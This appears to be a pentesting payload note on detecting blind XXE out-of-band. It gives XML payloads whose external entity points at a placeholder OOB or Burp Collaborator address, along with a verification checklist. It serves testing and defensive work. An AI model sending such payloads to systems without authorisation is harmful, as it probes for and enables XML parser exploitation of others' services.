# Payload 03 – Blind XXE OOB Detection

## Purpose

Detect XXE when the application does not return the external entity's value.

---

## Basic OOB Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "YOUR-OOB-URL">
]>
<foo>
    &xxe;
</foo>
```

---

## Burp Collaborator

Generate a unique Collaborator address and place it in the external entity:

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "YOUR-COLLABORATOR-DOMAIN">
]>
```

Reference:

```xml
&xxe;
```

---

## Attack Flow

```text
XML
 ↓
External Entity
 ↓
OOB Address
 ↓
XML Parser
 ↓
DNS / HTTP Interaction
 ↓
Collaborator
```

---

## Verification

Check for:

```text
DNS interaction
HTTP interaction
```

An interaction indicates that the application attempted to resolve the external entity.

---

## Why This Works

The application does not need to reflect the entity value.

The network interaction provides an independent observation channel.

---

## Testing Checklist

```text
☐ Generate unique OOB address
☐ Insert into external entity
☐ Send XML request
☐ Monitor Collaborator
☐ Record interaction
☐ Confirm XML parser behavior
```